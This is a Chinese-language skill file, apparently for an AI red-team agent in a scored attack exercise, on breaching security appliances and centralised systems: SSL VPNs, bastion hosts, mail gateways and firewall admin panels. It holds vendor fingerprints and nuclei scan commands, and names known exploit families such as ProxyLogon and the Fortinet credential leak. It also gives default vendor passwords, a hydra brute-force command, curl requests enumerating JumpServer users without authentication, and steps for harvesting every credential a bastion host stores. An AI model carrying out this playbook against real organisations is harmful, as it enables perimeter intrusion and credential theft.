---
name: secdev-boundary
description: 安全设备与集权系统直取：深信服/H3C/奇安信/TOPSEC 的 VPN 与上网行为管理、堡垒机、邮件网关、防火墙管理口的已知漏洞与弱口令入口；边界突破与集权系统两档高分的打法
whenToUse: 资产里出现 SSL VPN 门户、行为管理登录页、堡垒机入口、邮件网关、设备管理口（4430/443/8080/8443 上的中文设备页）；要打边界突破分或集权系统分时
role: exploit
enabled: true
---

# 安全设备与集权系统（最贵的那发子弹）

政企靶场里**分值最高的入口往往不是业务系统，而是这些"管人的机器"**：
- **边界突破**（`boundary-logical` 1000 / `boundary-strong` 10000 / `boundary-physical` 30000）——打穿 VPN/边界设备 = 直接进内网；
- **集权系统**（`central-system` 管理员 500）——堡垒机/域控/SSO/终端管理后台，**一台顶一片**。

安全设备的共性：**固件式系统、Nday 命中率极高、默认口令存活率高、监控弱**。这是弹药库里性价比最高的一面。

## 识别：先认出它是谁（技能 `web-fingerprint` 的加强表）

| 设备类型 | 常见端口 | 识别特征（title / 页脚 / 证书 / 路径） |
| --- | --- | --- |
| SSL VPN | 443/8443/10443/2663 | 「SSL VPN 在线用户」/`/por/login_psw.csp`（深信服）/`/remote/login`（Fortinet）/`/sslvpn/portal.html`（Panabit） |
| 上网行为管理 | 80/443/8080 | 「上网行为管理」/明御（DBAppSecurity）/PAN-OS/深信服 aB/网康 |
| 堡垒机 | 443/8080/22 网页 | 「堡垒机」/齐治 ShunDB/TOTEM/帕拉迪/JumpServer（`/logout/`+`/api/users/` 未授权） |
| 邮件网关 | 443/8443/10000 | 「邮件安全网关」/Coremail 管理端/Exchange OWA（`/owa/auth/logon.aspx`） |
| 防火墙管理口 | 443/8443/4430/444 | 「Web 管理」/TOPSEC（`/login.cgi`）/H3C Comware（`/login.html`+`/ddwtf`）/天清汉马/山石/安恒 |
| 终端管理/EDR 控制台 | 8080/8443 | 「终端安全管理系统」/天擎（360）/EDR 控制台 |

**识别口诀**：中文登录页 + 公司名出现在版权 + 非常规端口 = 先当安全设备打，别当业务系统打。

## 一、Nday 优先（指纹对上就查库，技能 `nuclei-scan` 同口径）

```bash
# 1) 本机两层先查：知识库 + nuclei 模板（设备类模板极全）
redteam_poc_search  # 按厂商名查：Sangfor / H3C / QAX / TOPSEC / Fortinet / JumpServer / Exchange
nuclei -u https://TARGET -t ~/.local/nuclei-templates/cves -t ~/.local/nuclei-templates/default-credentials \
        -t ~/.local/nuclei-templates/exposures -s critical,high -o runs/secdev.jsonl
# 2) 高发设备漏洞族（示例，版本以 poc_search 实际命中为准）：
#    深信服     : STPOPO/未授权读文件 /portal/..;/%2e/… 、Sangfor VPN RCE（2020-2024 多代）
#    H3C        : /ddwtf 信息泄露、IMC 系列 RCE、Comware 未授权
#    奇安信     : 天擎/终端管理 上传与 SQLi、网神 SecGate 未授权
#    TOPSEC     : /login.cgi 默认口令、防火墙后台越权
#    JumpServer : /api/users/ 未授权枚举 + Celery 反序列化 RCE
#    Exchange   : ProxyLogon(2021)/ProxyShell(2021)/ProxyNotShell(2022) → 直接 SYSTEM
#    Fortinet   : CVE-2018-13379  VPN 凭据泄露（/sslvpn+/remote/logincheck 组合）
```

**Exchange/邮件网关优先打**——ProxyLogon 一发就是 `central-system`（邮件系统集权）+ 服务器权限双得分。

## 二、默认口令与凭据面（Nday 打完打这发）

```bash
# 设备管理口默认口令表（nuclei default-credentials 模板族 + 手工小字典）
#   admin/admin, admin/password, admin/Admin@123, superman/discover,
#   audit/audit, 深信服 admin/admin123, TOPSEC admin/(空), H3C admin/h3c
# 逐口试（HTTP 表单类用 hydra http-post-form，见 credential-attack）
hydra -L dev_users.txt -P dev_passes.txt TARGET https-get-form "/login.cgi:user=^USER^&pass=^PASS^:F=incorrect" -t 2 -w 4
# ⚠ 设备登录限速/锁定普遍比业务系统狠：-t 2、失败 5 次换下一组，绝不跑大字典
```

**VPN 门户撞库**（边界突破的常规入口）：行为管理/VPN 上常有**域账号直接登录**——
拿 `credential-attack` 里已破的账号或单位拼音+年份小字典，先试 VPN 门户；**VPN 登进去 = 内网门票**，直接跳内网阶段。

## 三、JumpServer / 堡垒机专项（集权系统最快路径）

```bash
# JumpServer 未授权三连
curl -sk "https://TARGET/api/users/?limit=10" | head -c 400        # 未授权枚举用户
curl -sk "https://TARGET/api/ops/jobs/" | head -c 400              # 任务列表泄露
# 拿到账号登录后：堡垒机里直接能看到"它能连谁"——资产清单+凭据一次收割
# 堡垒机 = 内网地图：它托管的主机与凭据全部落库（redteam_credential_add + asset_add）
```

堡垒机打进去的意义：**不用横扫就知道内网谁好打**——它的主机清单和托管凭据是内网阶段最高质量的输入。

## 四、命中后的边界判定（记分口径，别记错档）

- **VPN/行为管理拿到用户会话或管理权** → 按证据强度选 `boundary-logical`（逻辑隔离穿透）/ `boundary-strong`（强边界）/ `boundary-physical`（物理网段穿透）——**判定标准见 `redteam_score_list` 里各条的 src 说明**；
- **堡垒机/域控/SSO/终端管理后台拿到管理员** → `central-system`（管理员档 500）；
- 边界突破**整个目标只算一次**（G 口径），拿到第一条可用通道就记分，别重复刷；
- **VPN 登进去必须实测内网可达**（走客户端网段 ping/扫一条内网资产）才算边界突破——只有门户登录页进去不算穿。

## 失败分支

- **设备版本判不准**（固件页不写版本）：证书 CN/OID、JS 文件哈希、特有路径响应差异三管齐下定版本；定不准就打**跨版本稳的洞**（未授权读、默认口令）不打精确 RCE。
- **Nday 全失败**：设备管理口常有**调试接口/信息泄露**（`/dump`、`/sysdump`、`/logs`、备份文件下载）——配置备份里有明文/可逆凭据，直接喂 `credential-attack`。
- **登录被锁**：设备锁定窗口长（10-30 分钟常见），锁了就走信息泄露路径，别硬喷。
- **管理口只对内网开放**：记下端口指纹回报指挥——外网打不进不等于没有，**内网阶段第一发就打它**（写进该资产 `surface`）。

## 结果落库（必须做）

- 设备资产：`redteam_asset_add` 端口带 `service`（写厂商+型号，如 `sangfor-sslvpn`）+ `url` + `title`——**型号是后续 Nday 的检索键**。
- 每个命中：`redteam_vuln_add`（带 CVE/厂商）+ `redteam_http_evidence_add`（原始请求）。
- 边界突破/集权得分：`redteam_score_hit`（`boundary-*` 按证据档 / `central-system`），evidence 写"哪个设备、拿到什么权限、内网实测可达证据"。
- 堡垒机里收割的主机清单与托管凭据：逐条 `redteam_asset_add` + `redteam_credential_add`（`source=bastion-host`）。

## 纪律

- 安全设备**重启=全网断**，生产靶场禁止任何"重启生效"类利用；只读洞优先，写文件类先确认路径不存在再写。
- 设备口令爆破限流 `-t 2`、小字典（≤50 组），打锁了比没打还糟。
- 边界突破记分必须带**内网可达实测证据**（一条内网资产的响应），没有就记 `candidate` 待验证。
